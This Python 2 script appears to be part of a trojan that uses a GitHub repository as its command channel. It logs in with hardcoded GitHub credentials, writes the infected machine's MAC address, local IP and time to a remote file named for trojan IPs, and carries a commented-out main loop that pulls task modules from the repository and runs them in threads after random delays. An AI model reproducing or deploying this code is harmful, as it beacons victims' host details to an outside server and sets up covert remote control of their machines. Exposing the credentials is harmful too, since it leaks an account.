# -*- coding: utf-8 -*-
import socket
from github3 import *
import fileOperation
#import git_trojan



def connect_to_github():
    gh = login(username="OXVyeah", password="heiya233")
#    print(gh)
    # repo0 : use functions from "github3.repo0s.repo0.//repo0sitory//"
    repo0 = gh.repository("OXVyeah", "TROyeah")
 #   print(repo0)
#    print "repo0 homepage",repo0.homepage
#    print "repo0 download_url",repo0.download_url
    #repo0.key?
#    print "repo0 page",repo0.pages()
    # con : github3.repo0s.contents.//Contents//
    # if have the same file will repo0rt error
 #   repo0.create_file("ip/n.txt","from py",socket.getfqdn(socket.gethostname())+":"+get_ip())
 #   print "con",con
 #   print "con.content",con.content	#real content of txt in base64-encoded
 #   print "con.content",str(con.content)
#    print "con.content.decode",con.content.decode
#    print "system decode base64",base64.decodestring(str(con.content))
 #   dec = con.decoded('utf-8')
#    con.content.delete("try to delete the file")
 #   sha0 = con.sha
 #   repo0.update_file("ip/n.txt","update py from repo0","is it append??\nnew msg",sha0)
#    con.update("update py from con","append??\nnew msg2")
#   repo0.delete_file("n.txt","delete test txt from py",sha) #sha
# pull request means upload the correction to repo0 and decided by repo0 if its correct
    return repo0



#connect_to_github()
rep = connect_to_github()
if rep.contents("ip/mumaip.txt") == None :
#	print "ip"
	rep.create_file("ip/mumaip.txt","mumaip.txt automatically from py","INITIALIZE 127.0.0.1 9/10 10:57:00")
con = rep.contents("ip/mumaip.txt")
d,t = fileOperation.getLocalTime()
fileOperation.writeIpAppend(con,fileOperation.getmac().replace(' ',''),fileOperation.LocalIp(),d,t)
print "update ip finish"


'''
trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []

task_queue = Queue.Queue()
sys.meta_path = [GitImporter()]

# main trojan loop
while True:
    if task_queue.empty():
        config = git_trojan.get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))

    time.sleep(random.randint(1000, 10000))
'''

client.Operation(rep)

